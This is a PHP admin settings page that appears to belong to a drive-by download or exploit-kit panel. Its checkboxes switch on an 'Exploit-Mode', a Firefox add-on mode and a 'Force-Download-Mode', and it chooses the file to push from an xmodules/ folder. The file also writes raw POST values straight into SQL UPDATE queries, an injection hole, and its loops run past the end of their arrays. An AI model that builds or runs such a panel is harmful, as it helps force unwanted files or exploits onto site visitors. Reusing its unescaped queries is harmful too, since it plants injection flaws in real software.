<div align=left><h1>Force download settings</h1><br><br>
<form name=settings method=POST action=?modul=main>

<?php
include('include/mysql_connect.php');

if(isset($_POST['change'])) {
	$modes=array("mode_debug", "mode_log",  "mode_exploit", "mode_ffaddon", "mode_forcedl", "mode_ignore_version");
	
	for($i=0; $i<=count($modes); $i++) {
		$mode=$modes[$i];
		if($_POST[$mode] == "on") {
			$sql = 'UPDATE `'.$mysql_prefix.'settings` SET `status` = \'true\' WHERE `name` = \''.$mode.'\'';
			mysql_query($sql) OR die(mysql_error());
			
		} elseif(!isset($_POST[$mode]) && $mode!= "") {
			$sql = 'UPDATE `'.$mysql_prefix.'settings` SET `status` = \'false\' WHERE `name` = \''.$mode.'\'';
			mysql_query($sql) OR die(mysql_error());
		}
	}
	
	$files=array("ffaddon_file", "forcedl_file");
	for($i=0; $i<=count($files); $i++) {
		$file=$files[$i];
		if(isset($_POST[$file])) {
			$sql = 'UPDATE `'.$mysql_prefix.'settings` SET `status` = \''.$_POST[$file].'\' WHERE `name` = \''.$file.'\'';
			mysql_query($sql) OR die(mysql_error());
		}
	}
}

if(SettingTrue("mode_debug")) { $state="<font size=3 color=orange><b>Debug Mode Active!</b></font><br>"; }
echo $state;
$state="";

if(SettingTrue("mode_debug")) { $state="checked=checked"; }
echo "Debug Mode: <input type=checkbox name=mode_debug $state><br>";

$state="";
if(SettingTrue("mode_log")) { $state="checked=checked"; }
echo "Logging: <input type=checkbox name=mode_log $state><br><br>";

$state="";
if(SettingTrue("mode_exploit")) { $state="checked=checked"; }
echo "Exploit-Mode: <input type=checkbox name=mode_exploit $state><br><br>";

$state="";
if(SettingTrue("mode_ignore_version")) { $state="checked=checked"; }
echo "Ignore Version: <input type=checkbox name=mode_ignore_version $state><br><br>";

$active="disabled";
$state="";
if(SettingTrue("mode_ffaddon")) { $state="checked=checked"; $active=""; }
echo "Firefox-Addon-Mode: <input type=checkbox name=mode_ffaddon $state onclick=\"this.form.ffaddon_file.disabled=!this.checked\"><br>";

$state=SettingTrue("ffaddon_file", 1);
echo "Firefox-Addon-File: <input type=text name=ffaddon_file value=$state $active><br><br>";

$active="disabled";
$state="";
if(SettingTrue("mode_forcedl")) { $state="checked=checked"; $active=""; }
echo "Force-Download-Mode: <input type=checkbox name=mode_forcedl $state onclick=\"this.form.forcedl_file.disabled=!this.checked\"><br>";

$state="";
$state=SettingTrue("forcedl_file", 1);
echo "Forcedownload-File: <select $active name=forcedl_file>";
if(empty($state)) {
echo "<option>select...</option>";
}
$d_state=explode('xmodules/', $state);
echo "<option value=$state>".$d_state['1']."</option>";
$d=dir('xmodules/');
	while (false !== ($entry = $d->read())) {
		if($entry!='.' AND $entry!='..' AND $entry!=$d_state['1']) {
			echo "<option value=\"xmodules/$entry\">$entry</option>";
		}
	}
$d->close();
echo "</select><br>";

?>
</div>
<br><input type=submit value=Set name=change>
</form>